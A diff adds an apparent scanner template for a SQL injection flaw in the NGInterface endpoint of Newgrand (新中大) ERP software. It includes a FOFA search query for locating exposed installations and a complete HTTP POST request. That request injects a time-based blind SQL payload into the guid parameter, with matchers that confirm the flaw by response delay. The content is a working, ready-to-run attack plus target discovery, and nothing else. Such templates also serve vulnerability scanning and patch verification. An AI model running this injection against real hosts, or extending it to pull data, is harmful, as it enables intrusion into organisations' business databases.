@@ -1,0 +1,26 @@
+## id: VEID-2025-0902
+## name: 新中大ERP企业管理软件 NGInterface 存在SQL注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2025
+## fofa-query: body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
+## verification: true
+
+
+POST /filesrv/NGInterface/Index HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+type=getfilelist&guid=';WAITFOR+DELAY+'0:0:5'--
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: response_time > 5 && body contains "[]"
+
+
+
+
+
+# @VEIL-STAMP: ee1d5be018bc229760078f28586b34b79b55d0ee514d9c3942bcb0cd1ec2d0ec
